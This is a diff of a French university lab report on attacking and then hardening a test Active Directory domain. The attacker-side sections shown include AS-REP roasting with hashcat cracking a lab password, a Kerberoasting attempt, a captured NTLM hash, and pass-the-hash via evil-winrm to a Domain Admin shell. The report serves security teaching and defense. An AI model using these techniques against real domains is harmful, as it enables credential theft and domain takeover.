@@ -1,22 +1,19 @@
 # Analyse et Durcissement de la Sécurité d'un Environnement Active Directory face aux Attaques Internes
-
+NAJAR YASSINE, ACHRAF LAGHLALI, MOUAD TIMJIJT##
 > **Thème:** De l'utilisateur non privilégié à l'administrateur du domaine.  
 > **Domaine de laboratoire:** `ENSA.local`  
-> **Méthodologie:** Attacker-first — simulation d'un insider malveillant, exploitation, puis durcissement.
-
----
+> **Méthodologie:** Red team, c'est la simulation d'un insider malveillant, exploitation, puis durcissement.
 
 ## Table des matières
 
-1. [Architecture du laboratoire](#1-architecture-du-laboratoire)
-2. [Phase 1 — Mise en place](#2-phase-1--mise-en-place)
-3. [Phase 2 — Reconnaissance](#3-phase-2--reconnaissance)
-4. [Phase 3 — Exploitation](#4-phase-3--exploitation)
-5. [Phase 5 — Durcissement (Person 2)](#5-phase-5--durcissement-person-2)
-6. [Phase 6 — Vérification](#6-phase-6--vérification)
-7. [Références](#7-références)
+1. [Architecture du laboratoire](#1architecture_du_laboratoire)
+2. [Phase 1 : Mise en place](#2phase_de_la_mise_enplace)
+3. [Phase 2 : Reconnaissance](#3phase_de_reconnaissance)
+4. [Phase 3 : Exploitation](#4phase_de_éxploitation)
+5. [Phase 5 : Durcissement (Achraf](#5phase_durcissement_person_2)
+6. [Phase 6 : Vérification](#6phase_de_vérification)
+7. [Références](#7_références)
 
----
 
 ## 1. Architecture du laboratoire
 
@@ -33,8 +30,8 @@ L'environnement de laboratoire simule un réseau d'entreprise interne composé d
 **Domaine:** `ENSA.local`
 
 ```
-[Kali 192.168.56.30] ──────────────────────────────────┐
-[WS01 192.168.56.20] ──── Host-Only (vboxnet0) ─────── [DC01 192.168.56.10]
+[Kali 192.168.56.30]
+[WS01 192.168.56.20]  Host-Only (vboxnet0)  [DC01 192.168.56.10]
 ```
 
 > **Note VirtualBox:** Chaque VM doit avoir son adaptateur réseau en mode **Host-Only (vboxnet0)** avec le **Mode Promiscuité = Permettre tout**. Sans cette configuration, les VMs ne peuvent pas communiquer entre elles même si elles sont sur le même réseau.
@@ -71,7 +68,7 @@ Ces erreurs de configuration simulent des erreurs humaines courantes dans les en
 | Misconfiguration | Impact | Phase d'exploitation |
 |---|---|---|
 | Pré-auth Kerberos désactivée sur `john.doe` | AS-REP Roasting | 3.1 |
-| `jane.admin` membre de Admins du domaine | Escalade de privilèges immédiate | 3.3 |
+| `jane.admin` membre d’Admins du domaine | Escalade de privilèges immédiate | 3.3 |
 | SPN configuré sur `svc.backup` | Kerberoasting | 3.2 |
 | LDAP signing désactivé (GPO) | Énumération LDAP/BloodHound | 2.1 / 2.3 |
 | RC4 activé pour Kerberos (GPO) | Compatibilité outils d'attaque | 3.2 |
@@ -99,7 +96,7 @@ L'AD stocke les éléments suivants :
 |---|---|
 | **Domaine** | Périmètre logique de l'environnement AD (`ENSA.local`) |
 | **Contrôleur de domaine (DC)** | Serveur qui héberge la base de données AD et gère l'authentification |
-| **LDAP** | Protocole utilisé pour interroger l'annuaire |
+| **LDAP** |  (Lightweight Directory Acess Protocol) Protocole utilisé pour interroger l'annuaire |
 | **Kerberos** | Protocole d'authentification utilisé par AD |
 | **GPO** | Politiques de groupe appliquées aux machines et utilisateurs |
 
@@ -108,9 +105,9 @@ L'AD stocke les éléments suivants :
 ### 2.1 Configuration réseau de DC01
 
 Un contrôleur de domaine doit impérativement avoir une adresse IP fixe car chaque machine du réseau doit pouvoir le trouver pour :
-- **La résolution DNS** — traduire `ENSA.local` en une adresse IP
-- **L'authentification Kerberos** — émission de tickets pour les sessions utilisateurs
-- **Les requêtes LDAP** — répondre à des questions telles que "à quels groupes cet utilisateur appartient-il ?"
+- **La résolution DNS** : traduire `ENSA.local` en une adresse IP.
+- **L'authentification Kerberos** : émission de tickets pour les sessions utilisateurs.
+- **Les requêtes LDAP** : répondre à des questions telles que "à quels groupes cet utilisateur appartient-il ?"
 
 Si l'IP du DC changeait de manière dynamique (DHCP), l'ensemble du domaine s'effondrerait.
 
@@ -131,17 +128,17 @@ Carte Ethernet Ethernet :
                                        192.168.56.10
 ```
 
-> **DHCP activé = Non** ✅ — L'IP est bien statique.
+> **DHCP activé = Non** L'IP est bien statique.
 
 ---
 
 ### 2.2 Vérification du domaine ENSA.local
 
 **Active Directory Domain Services (AD DS)** est le rôle principal du serveur Windows qui :
-- Stocke la base de données AD (`NTDS.dit`)
-- Gère l'émission de tickets Kerberos
-- Répond aux requêtes LDAP
-- Applique les stratégies de groupe (GPO)
+- Stocke la base de données AD (`NTDS.dit`).
+- Gère l'émission de tickets Kerberos.
+- Répond aux requêtes LDAP.
+- Applique les stratégies de groupe (GPO).
 
 L'installation d'AD DS transforme un serveur Windows classique en contrôleur de domaine.
 
@@ -170,10 +167,10 @@ RIDMaster                          : WIN-GGPOGFOP203.ENSA.local
 ```
 
 **Lecture de l'output :**
-- `DNSRoot = ENSA.local` → Nom de notre domaine ✅
-- `DomainMode = Windows2025Domain` → Niveau fonctionnel le plus récent ✅
-- `PDCEmulator = WIN-GGPOGFOP203.ENSA.local` → Un seul DC dans le domaine (normal pour notre lab) ✅
-- `DomainSID` → Identifiant unique du domaine
+- `DNSRoot = ENSA.local` → Nom de notre domaine.
+- `DomainMode = Windows2025Domain` → Niveau fonctionnel le plus récent.
+- `PDCEmulator = WIN-GGPOGFOP203.ENSA.local` → Un seul DC dans le domaine (normal pour notre lab).
+- `DomainSID` → Identifiant unique du domaine.
 
 **Renommage du serveur en DC01 :**
 
@@ -207,13 +204,13 @@ Clic droit sur ENSA.local → New → Organizational Unit
 **OUs créées :**
 ```
 ENSA.local
-├── Users (conteneur intégré — contient john.doe et jane.admin)
+├── Users (conteneur intégré qui contient john.doe et jane.admin)
 ├── OU=ServiceAccounts (contient svc.backup et svc.web)
 ├── OU=Workstations (contient WS01)
 └── OU=Servers (contient DC01)
 ```
 
-(SCREENSHOT NEEDED — ADUC montrant les OUs créées)
+(SCREENSHOTS ADUC montrant les OUs créées)
 
 ---
 
@@ -221,7 +218,7 @@ ENSA.local
 
 **Dans ADUC, pour chaque utilisateur :** clic droit sur le conteneur/OU → New → User
 
-> ⚠️ Décocher "L'utilisateur doit changer le mot de passe à la prochaine ouverture de session" et cocher "Le mot de passe n'expire jamais" pour tous les comptes.
+> Décocher "L'utilisateur doit changer le mot de passe à la prochaine ouverture de session" et cocher "Le mot de passe n'expire jamais" pour tous les comptes.
 
 **Comptes créés :**
 
@@ -234,7 +231,7 @@ ENSA.local
 
 > **Note sur les mots de passe :** Windows Server 2025 impose des règles strictes sur la complexité des mots de passe. Les mots de passe choisis ont été basés sur des termes techniques familiers (`PDCEmulator`, `QuotasContainer`, `RIDMaster`) — une erreur humaine courante qui les rend vulnérables aux attaques par dictionnaire ciblé.
 
-(SCREENSHOT NEEDED — ADUC montrant les utilisateurs créés dans leurs OUs)
+(SCREENSHOT NEEDED ADUC montrant les utilisateurs créés dans leurs OUs)
 
 ---
 
@@ -252,16 +249,16 @@ ADUC → Users → clic droit john.doe → Propriétés
 → Appliquer → OK
 ```
 
-(SCREENSHOT NEEDED — Propriétés de john.doe avec pré-auth désactivée)
+(SCREENSHOT NEEDED  Propriétés de john.doe avec pré-auth désactivée)
 
 ---
 
 #### Misconfiguration 2 — Ajout de jane.admin aux Admins du domaine
 
-**Théorie — Privilege Creep :**
-Nous accordons des privilèges excessifs à un compte d'assistance. `jane.admin` est censée être une utilisatrice d'assistance standard, mais elle dispose de tous les droits d'administrateur de domaine. Il s'agit d'une des erreurs de configuration les plus fréquentes dans Active Directory — l'extension progressive des privilèges.
+**Théorie : Privilege Creep :**
+Nous accordons des privilèges excessifs à un compte d'assistance. `jane.admin` est censée être une utilisatrice d'assistance standard, mais elle dispose de tous les droits d'administrateur de domaine. Il s'agit d'une des erreurs de configuration les plus fréquentes dans Active Directory : l'extension progressive des privilèges.
 
-Dans notre chaîne d'attaque, une fois les identifiants de `jane.admin` obtenus via Pass-the-Hash, nous obtenons immédiatement un accès complet à l'administration du domaine.
+Dans notre chaîne d'attaque, une fois les identifiants de `jane.admin` obtenus via Pass_the_Hash, nous obtenons immédiatement un accès complet à l'administration du domaine.
 
 **Un seul compte d'assistance compromis = prise de contrôle totale du domaine.**
 
@@ -273,16 +270,16 @@ ADUC → Users (conteneur intégré)
 → Appliquer → OK
 ```
 
-(SCREENSHOT NEEDED — Propriétés "Admins du domaine" montrant jane.admin comme membre)
+(SCREENSHOT NEEDED wa yassine :Propriétés "Admins du domaine" montrant jane.admin comme membre)
 
 ---
 
 #### Misconfiguration 3 — Configuration d'un SPN sur svc.backup
 
-**Théorie — Kerberoasting :**
+**Théorie : Kerberoasting :**
 Un SPN (Service Principal Name) est un identifiant qui lie un service à un compte utilisateur dans Kerberos. Lorsqu'un utilisateur veut accéder à un service, Kerberos émet un ticket chiffré avec le hash du mot de passe du compte de service. Si le mot de passe est faible, un attaquant peut demander ce ticket et le casser hors ligne.
 
-La raison pour laquelle c'est dangereux en environnement réel : les comptes de service sont souvent oubliés — configurés une fois, jamais renouvelés, avec des mots de passe faibles qui dorment tranquillement dans l'AD.
+La raison pour laquelle c'est dangereux en environnement réel : les comptes de service sont souvent oubliés ,configurés une fois, jamais renouvelés, avec des mots de passe faibles qui dorment tranquillement dans l'AD.
 
 **Dans CMD en tant qu'Administrateur :**
 
@@ -301,14 +298,14 @@ setspn -L ENSA\svc.backup
 MSSQLSvc/dc01.ENSA.local:1433
 ```
 
-✅ Le SPN est bien configuré.
+Le SPN est bien configuré.
 
 ---
 
 ### 2.6 Plantation des flags CTF
 
 **Théorie :**
-La plantation des flags sert de mécanisme de vérification. Au lieu de simplement affirmer "cette attaque fonctionne", nous le prouvons en plaçant des secrets qui ne sont récupérables que si l'attaque réussit. Après le durcissement en Phase 5, nous relançons les attaques — si les flags ne sont plus récupérables, le durcissement est confirmé efficace.
+La plantation des flags sert de mécanisme de vérification. Au lieu de simplement affirmer "cette attaque fonctionne", nous le prouvons en plaçant des secrets qui ne sont récupérables que si l'attaque réussit. Après le durcissement en Phase 5, nous relançons les attaques  si les flags ne sont plus récupérables, le durcissement est confirmé efficace.
 
 **Flag 1 — `FLAG{kerber0astab0g}` dans la description de svc.backup :**
 
@@ -319,7 +316,7 @@ ADUC → OU=ServiceAccounts → clic droit svc.backup → Propriétés
 → Appliquer → OK
 ```
 
-(SCREENSHOT NEEDED — Propriétés de svc.backup avec le flag dans Description)
+(SCREENSHOT NEEDED wa yassine Propriétés de svc.backup avec le flag dans Description)
 
 **Flag 2 — `FLAG{da_owned_abog}` sur le bureau de DC01 :**
 
@@ -330,7 +327,7 @@ Clic droit sur le bureau de DC01 → Nouveau → Document texte
 → Enregistrer
 ```
 
-(SCREENSHOT NEEDED — flag.txt sur le bureau de DC01)
+(SCREENSHOT NEEDED wa yassine flag.txt sur le bureau de DC01)
 
 ---
 
@@ -344,7 +341,7 @@ Paramètres → Réseau et Internet → Ethernet → Modifier
   IP:       192.168.56.20
   Masque:   255.255.255.0
   Passerelle: 192.168.56.1
-  DNS:      192.168.56.10  ← pointe vers DC01
+  DNS:      192.168.56.10  (pointe vers DC01)
 → Enregistrer
 ```
 
@@ -353,7 +350,7 @@ La jonction au domaine repose entièrement sur la résolution DNS. Windows 11 do
 
 #### Jonction au domaine ENSA.local
 
-> ⚠️ **Important :** DC01 et WS01 doivent être démarrés **simultanément** pour que la jonction fonctionne.
+>  **Important :** DC01 et WS01 doivent être démarrés **simultanément** pour que la jonction fonctionne. (my ram was killing me lol)
 
 ```
 Paramètres → Système → Informations système
@@ -377,7 +374,7 @@ ENSA
 
 ✅ WS01 est bien joint au domaine `ENSA.local`.
 
-(SCREENSHOT NEEDED — WS01 montrant le domaine ENSA.local dans les informations système)
+(SCREENSHOT NEEDED wa yassine WS01 montrant le domaine ENSA.local dans les informations système)
 
 ---
 
@@ -406,8 +403,8 @@ sudo systemctl restart networking
 #### Résolution DNS et accès Internet (double adaptateur)
 
 Pour avoir à la fois l'accès au lab ET internet sur Kali, nous utilisons deux adaptateurs :
-- `eth0` — Host-Only (`192.168.56.30`) pour attaquer le lab
-- `eth1` — NAT pour télécharger les outils
+- `eth0`  Host-Only (`192.168.56.30`) pour attaquer le lab.
+- `eth1`  NAT pour télécharger les outils.
 
 **Activer l'adaptateur NAT dans VirtualBox :**
 ```
@@ -433,7 +430,7 @@ ping 192.168.56.10
 64 bytes from 192.168.56.10: icmp_seq=2 ttl=128 time=4.07 ms
 ```
 
-✅ Kali peut joindre DC01.
+ Kali peut joindre DC01.
 
 **Vérification DNS :**
 
@@ -449,7 +446,7 @@ Name:   ENSA.local
 Address: 192.168.56.10
 ```
 
-✅ La résolution DNS fonctionne.
+ La résolution DNS fonctionne.
 
 ---
 
@@ -459,16 +456,16 @@ Address: 192.168.56.10
 
 La phase de reconnaissance consiste à collecter un maximum d'informations sur l'environnement Active Directory cible depuis la machine attaquante (Kali Linux), en simulant un attaquant interne ayant uniquement accès au réseau.
 
-Cette phase est l'équivalent de la phase OSINT dans un CTF — avant d'exploiter quoi que ce soit, on cartographie la surface d'attaque.
+Cette phase est l'équivalent de la phase OSINT dans un CTF ,avant d'exploiter quoi que ce soit, on cartographie la surface d'attaque.
 
 **Pourquoi la reconnaissance est-elle critique ?**
 
 Dans un environnement Active Directory, de nombreux protocoles exposent des informations sans authentification par défaut :
-- **LDAP (port 389)** — peut permettre des requêtes pour lister les utilisateurs, groupes et attributs
-- **SMB (port 445)** — peut exposer les partages réseau et les politiques de sécurité
-- **DNS (port 53)** — peut révéler la structure interne du domaine
-- **Kerberos (port 88)** — permet de valider l'existence de comptes sans authentification
-- **WinRM (port 5985)** — permet un shell PowerShell distant si des credentials sont obtenus
+- **LDAP (port 389)** : peut permettre des requêtes pour lister les utilisateurs, groupes et attributs
+- **SMB (port 445)** : peut exposer les partages réseau et les politiques de sécurité
+- **DNS (port 53)** : peut révéler la structure interne du domaine
+- **Kerberos (port 88)** : permet de valider l'existence de comptes sans authentification
+- **WinRM (port 5985)** : permet un shell PowerShell distant si des credentials sont obtenus
 
 **Outils utilisés :**
 
@@ -558,22 +555,22 @@ Domain password information:
 | Découverte | Valeur | Impact |
 |---|---|---|
 | 13 utilisateurs énumérés | Surface d'attaque complète | Mappée |
-| `john.doe` (acb: `0x00010210`) | Pré-auth Kerberos désactivée | ✅ Cible AS-REP Roasting |
-| `svc.backup` description | `FLAG{kerber0astab0g}` | 🎯 Flag 1 capturé ! |
+| `john.doe` (acb: `0x00010210`) | Pré-auth Kerberos désactivée |  Cible AS-REP Roasting |
+| `svc.backup` description | `FLAG{kerber0astab0g}` |  Flag 1 capturé ! |
 | Partages accessibles | NETLOGON, SYSVOL | Lecture GPO possible |
 | Lockout threshold | Aucun | Brute force sans risque |
 | SMB signing | Requis | NTLM relay impossible |
 
-**Observation :** Windows Server 2025 bloque les liaisons LDAP anonymes par défaut — la commande nécessite des credentials valides (`john.doe`). Cependant, avec un simple compte utilisateur standard, l'intégralité de l'annuaire est accessible. Cela démontre qu'un insider avec les privilèges minimaux peut cartographier toute la surface d'attaque du domaine.
+**Observation :** Windows Server 2025 bloque les liaisons LDAP anonymes par défaut, la commande nécessite des credentials valides (`john.doe`). Cependant, avec un simple compte utilisateur standard, l'intégralité de l'annuaire est accessible. Cela démontre qu'un insider avec les privilèges minimaux peut cartographier toute la surface d'attaque du domaine.
 
-(SCREENSHOT NEEDED — Output complet de enum4linux-ng)
+(SCREENSHOT NEEDED wa yassine Output complet de enum4linux-ng)
 
 ---
 
 ### 3.2 Scan réseau avec Nmap
 
 **Qu'est-ce que Nmap ?**
-Nmap (Network Mapper) est un outil de scan réseau qui identifie les ports ouverts, les services qui tournent et leurs versions. Dans un CTF, c'est toujours le premier mouvement — avant d'exploiter quoi que ce soit, on cartographie ce qui est accessible.
+Nmap (Network Mapper) est un outil de scan réseau qui identifie les ports ouverts, les services qui tournent et leurs versions. Dans un CTF, c'est toujours le premier mouvement  avant d'exploiter quoi que ce soit, on cartographie ce qui est accessible.
 
 **Commande :**
 
@@ -636,16 +633,14 @@ Service Info: Host: DC01; OS: Windows
 - Clock skew de 3s → Kerberos fonctionnel (tolérance max: 5 minutes)
 - Hostname confirmé: `DC01.ENSA.local`
 
-(SCREENSHOT NEEDED — Output complet du scan nmap)
+(SCREENSHOT NEEDED : Output complet du scan nmap)
 
 ---
 
-### 3.3 BloodHound — Cartographie des chemins d'attaque
+### 3.3 BloodHound : Cartographie des chemins d'attaque
 
 **Qu'est-ce que BloodHound ?**
 BloodHound est un outil d'analyse de chemins d'attaque dans Active Directory. Il utilise la **théorie des graphes** pour identifier les chemins d'escalade de privilèges entre les objets AD (utilisateurs, groupes, ordinateurs). Au lieu de chercher aveuglément, on voit exactement quel chemin mène à Domain Admin.
-
-En analogie CTF : BloodHound est comme avoir la **carte du donjon** avant d'entrer. Au lieu d'essayer chaque porte, on voit exactement quel chemin mène au flag final.
 
 #### Installation
 
@@ -671,7 +666,7 @@ LocalAddress  LocalPort  RemoteAddress  RemotePort  State
 0.0.0.0       636        0.0.0.0        0           Listen
 ```
 
-✅ LDAPS (port 636) est bien en écoute.
+ LDAPS (port 636) est bien en écoute.
 
 **Désactivation du LDAP signing via GPO (nécessaire pour la collecte) :**
 
@@ -762,8 +757,8 @@ Se connecter à `http://localhost:8080` → glisser-déposer `bloodhound_data.zi
 | Requête | Résultat |
 |---|---|
 | Find Domain Admins | `jane.admin@ENSA.LOCAL`, `Administrateur@ENSA.LOCAL` |
-| Find AS-REP Roastable Users | `john.doe@ENSA.LOCAL` ✅ |
-| Find Kerberoastable Users | `svc.backup@ENSA.LOCAL` ✅ |
+| Find AS-REP Roastable Users | `john.doe@ENSA.LOCAL`  |
+| Find Kerberoastable Users | `svc.backup@ENSA.LOCAL`  |
 | Shortest Path to Domain Admins | `JANE.ADMIN → MemberOf → ADMINS DU DOMAINE` |
 
 **Graphe d'attaque BloodHound :**
@@ -774,15 +769,15 @@ DC01.ENSA.LOCAL
                       └─[CoerceToTGT]─► ENSA.LOCAL
                                             └─[Contains]─► USERS@ENSA.LOCAL
                                                               ├─[MemberOf]─► JANE.ADMIN
-                                                              │                  └─[MemberOf]─► ADMINS DU DOMAINE ✅
+                                                              │                  └─[MemberOf]─► ADMINS DU DOMAINE 
                                                               └─[WriteDacl]─► ADMINS DU DOMAINE
 ```
 
-(SCREENSHOT NEEDED — Graphe BloodHound montrant le chemin vers Domain Admin)
+(SCREENSHOT NEEDED Graphe BloodHound montrant le chemin vers Domain Admin)
 
-(SCREENSHOT NEEDED — Requête "Find AS-REP Roastable Users" montrant john.doe)
+(SCREENSHOT NEEDED  Requête "Find AS-REP Roastable Users" montrant john.doe)
 
-(SCREENSHOT NEEDED — Requête "Find Kerberoastable Users" montrant svc.backup)
+(SCREENSHOT NEEDED  Requête "Find Kerberoastable Users" montrant svc.backup)
 
 ---
 
@@ -794,17 +789,17 @@ DC01.ENSA.LOCAL
 [Kali — Attaquant interne]
         │
         ├─── 3.1 AS-REP Roast john.doe (pré-auth désactivée)
-        │         └── Hash AS-REP capturé → cracké avec hashcat: "Password123" ✅
+        │         └── Hash AS-REP capturé → cracké avec hashcat: "Password123" 
         │
         ├─── 3.2 Authentifié comme john.doe → Kerberoasting svc.backup
-        │         └── Bloqué par Windows Server 2025 (AES-only) ⚠️
+        │         └── Bloqué par Windows Server 2025 (AES-only) 
         │
         ├─── 3.3 Pass-the-Hash avec jane.admin
         │         └── Hash NTLM: 02e76cbda1853d84bc588db37f6f24ee
-        │              └── evil-winrm → Shell PowerShell sur DC01 ✅
+        │              └── evil-winrm → Shell PowerShell sur DC01 
         │
         └─── 3.4 Capture du flag final
-                  └── FLAG{da_owned_abog} 🎯
+                  └── FLAG{da_owned_abog} 
 ```
 
 ---
@@ -841,8 +836,8 @@ $krb5asrep$23$john.doe@ENSA.LOCAL:f31b0f9c58bbde787a033ab379e62c0f$325343b4f074b
 | `$krb5asrep$` | Type de hash — AS-REP Kerberos |
 | `23` | Type de chiffrement — RC4-HMAC (le plus faible) |
 | `john.doe@ENSA.LOCAL` | Compte ciblé |
-| `f31b0f9c...` | Checksum — utilisé pour vérifier le déchiffrement |
-| `325343b4...` | Clé de session chiffrée — c'est ce qu'on craque |
+| `f31b0f9c...` | Checksum — utilisé pour vérifier le déchiffrement et la detection des erreurs. |
+| `325343b4...` | Clé de session chiffrée  c'est ce qu'on craque |
 
 **Sauvegarde du hash :**
 
@@ -884,7 +879,7 @@ Recovered........: 1/1 (100.00%) Digests
 Progress.........: 33792/14344385 (0.24%)
 ```
 
-**🎯 Hash cracké en 1 seconde !**
+** Hash cracké en 1 seconde !**
 
 ```
 john.doe : Password123
@@ -892,7 +887,7 @@ john.doe : Password123
 
 > **Pourquoi c'est dangereux :** Hashcat a essayé des millions de mots de passe localement — le DC n'a jamais vu une seule tentative d'authentification. Aucun log de sécurité, aucune alerte. L'attaque est totalement invisible.
 
-(SCREENSHOT NEEDED — Output de hashcat montrant "Password123" cracké)
+(SCREENSHOT NEEDED: Output de hashcat montrant "Password123" cracké)
 
 ---
 
@@ -919,9 +914,7 @@ MSSQLSvc/dc01.ENSA.local:1433  svc.backup            2026-04-06 17:02:22.028809
 
 **Limitation rencontrée :** Windows Server 2025 impose **AES uniquement** pour Kerberos par défaut, empêchant le Kerberoasting RC4 standard. Malgré l'activation de RC4 via GPO, le problème persiste.
 
-> **Note importante pour le rapport :** Le SPN sur `svc.backup` a été confirmé via l'énumération — le vecteur d'attaque existe bel et bien. Sur un DC plus ancien (Windows Server 2016/2019), cette attaque réussirait identiquement à l'AS-REP Roasting. L'AES-only est une amélioration de sécurité significative de Windows Server 2025.
->
-> **Recommandation Phase 5 :** Désactiver RC4 et imposer AES uniquement est une mesure de durcissement recommandée.
+> **Note importante pour le rapport :** Le SPN sur `svc.backup` a été confirmé via l'énumération le vecteur d'attaque existe bel et bien. Sur un DC plus ancien (Windows Server 2016/2019), cette attaque réussirait identiquement à l'AS-REP Roasting. L'AES-only est une amélioration de sécurité significative de Windows Server 2025.
 
 ---
 
@@ -961,9 +954,9 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\jane.admin\Documents>
 ```
 
-**🎯 Shell PowerShell distant sur DC01 en tant que Domain Admin !**
+** Shell PowerShell distant sur DC01 en tant que Domain Admin !**
 
-(SCREENSHOT NEEDED — Shell evil-winrm actif sur DC01)
+(SCREENSHOT NEEDED  Shell evil-winrm actif sur DC01)
 
 ---
 
@@ -981,9 +974,9 @@ type "C:\Users\Administrateur\Desktop\flag.txt.txt"
 FLAG{da_owned_abog}
 ```
 
-**🎯 Domaine compromis — FLAG{da_owned_abog} capturé !**
+** Domaine compromis : FLAG{da_owned_abog} capturé !**
 
-(SCREENSHOT NEEDED — type flag.txt dans le shell evil-winrm montrant FLAG{da_owned_abog})
+(SCREENSHOT NEEDED : type flag.txt dans le shell evil-winrm montrant FLAG{da_owned_abog})
 
 ---
 
@@ -1013,7 +1006,7 @@ Un employé malveillant ou un attaquant ayant compromis n'importe quel poste de 
 
 ## 5. Phase 5 — Durcissement (Person 2)
 
-> ℹ️ Cette phase est à réaliser par **Person 2** à partir des résultats de la Phase 3.
+>  Cette phase est à réaliser par **Person 2** à partir des résultats de la Phase 3.
 
 ### Objectif
 
@@ -1085,7 +1078,7 @@ gpedit.msc → Computer Configuration → Windows Settings
 
 ## 6. Phase 6 — Vérification
 
-> ℹ️ À réaliser conjointement après la Phase 5.
+>  À réaliser conjointement après la Phase 5.
 
 ### Objectif
 
@@ -1138,8 +1131,8 @@ ping 192.168.56.10
 nslookup ENSA.local 192.168.56.10
 ```
 
-> ⚠️ **Ordre de démarrage des VMs :** Toujours démarrer **DC01 en premier**, attendre qu'il soit complètement démarré, puis démarrer Kali (et WS01 si nécessaire).
+>  **Ordre de démarrage des VMs :** Toujours démarrer **DC01 en premier**, attendre qu'il soit complètement démarré, puis démarrer Kali (et WS01 si nécessaire).
 
 ---
 
-*Documentation rédigée dans le cadre du projet universitaire — Analyse et durcissement de la sécurité d'un environnement Active Directory face aux attaques internes.*
+*Documentation rédigée dans le cadre du projet universitaire  Analyse et durcissement de la sécurité d'un environnement Active Directory face aux attaques internes.*
